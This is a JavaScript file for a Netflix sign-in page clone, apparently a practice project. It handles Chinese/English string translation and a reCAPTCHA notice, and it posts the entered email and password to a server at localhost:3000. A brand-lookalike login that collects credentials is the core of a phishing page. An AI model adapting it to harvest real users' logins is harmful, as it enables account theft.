// script.js

// Function to toggle reCAPTCHA info visibility
function toggleRecaptchaInfo() {
    var recaptchaPolicy = document.querySelector('.recaptcha-policy');
    var furtherUnderstanding = document.querySelector('.further-understanding');

    if (recaptchaPolicy.style.display === 'none') {
        recaptchaPolicy.style.display = 'block';
        furtherUnderstanding.style.display = 'none';
    } else {
        recaptchaPolicy.style.display = 'none';
        furtherUnderstanding.style.display = 'inline'; // 或 'inline-block'，根據需要
    }
}

// Define translation function and dictionary
var translations = {
    '登入': 'Sign in',
    '或': 'OR',
    '忘記密碼?': 'Forgot password?',
    '尚未加入 Netflix？': 'New to Netflix?',
    '進一步了解。': 'Learn More.',
    '電子郵件地址或手機號碼': 'Email or mobile number',
    '密碼': 'Password',
    '使用登入碼': 'Use a Sign-In Code',
    '記住我': 'Remember me',
    '馬上註冊。': 'Sign up now.',
    '此頁面受到 Google reCAPTCHA 保護，以確認您不是機器人。': 'This page is protected by Google reCAPTCHA to ensure you\'re not a bot.',
    '由 Google reCAPTCHA 收集的資訊受 Google《隱私權聲明》與《服務條款》約束，用來提供、維持並提升 reCAPTCHA 服務，並且維繫一般安全（Google 不會用於個人化廣告）。': 'The information collected by Google reCAPTCHA is subject to the Google Privacy Policy and Terms of Service, and is used for providing, maintaining, and improving the reCAPTCHA service and for general security purposes (it is not used for personalized advertising by Google).',
    '隱私權聲明': 'Privacy Policy',
    '有疑問嗎？請聯絡我們': 'Questions? Contact us.',
    '常見問題': 'FAQ',
    '說明中心': 'Help Center',
    '使用條款': 'Terms of Use',
    '隱私權': 'Privacy',
    'Cookie 設定': 'Cookie Preferences',
    '企業資訊': 'Corporate Information',
    '請輸入有效的電子郵件或電話號碼。': 'Please enter a valid email or phone number.',
    '您的密碼必須包含 4 至 60 個字元。': 'Your password must contain between 4 and 60 characters.'
    // Add more translations as needed
};

function translateToEnglish() {
    var elementsToTranslate = document.querySelectorAll('[data-translate]');
    elementsToTranslate.forEach(function(element) {
        var key = element.getAttribute('data-translate');
        if (translations[key]) {
            if (element.tagName === 'INPUT') {
                element.setAttribute('placeholder', translations[key]);
            } else {
                element.textContent = translations[key];
            }
        }
    });
}

function translateToChinese() {
    var elementsToTranslate = document.querySelectorAll('[data-translate]');
    elementsToTranslate.forEach(function(element) {
        var key = element.getAttribute('data-translate');
        if (key in translations) {
            if (element.tagName === 'INPUT') {
                element.setAttribute('placeholder', key);
            } else {
                element.textContent = key;
            }
        }
    });
}

function translateBasedOnSelectedLanguage() {
    var selectedLanguage = document.getElementById('language').value;
    if (selectedLanguage === 'en') {
        translateToEnglish();
    } else if (selectedLanguage === 'ch') {
        translateToChinese();
    }
}

// Translate page on language change
document.getElementById('language').addEventListener('change', translateBasedOnSelectedLanguage);

// Initial translation based on default language
document.addEventListener('DOMContentLoaded', translateBasedOnSelectedLanguage);

// Form submission handler
document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the default form submission

    var email = event.target.email.value;
    var password = event.target.password.value;

    // Send the data to the server
    fetch('http://localhost:3000/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ email: email, password: password })
    })
        .then(response => response.json())
        .then(data => {
            // Handle the server response here
            console.log('Success:', data);
        })
        .catch((error) => {
            console.error('Error:', error);
        });
});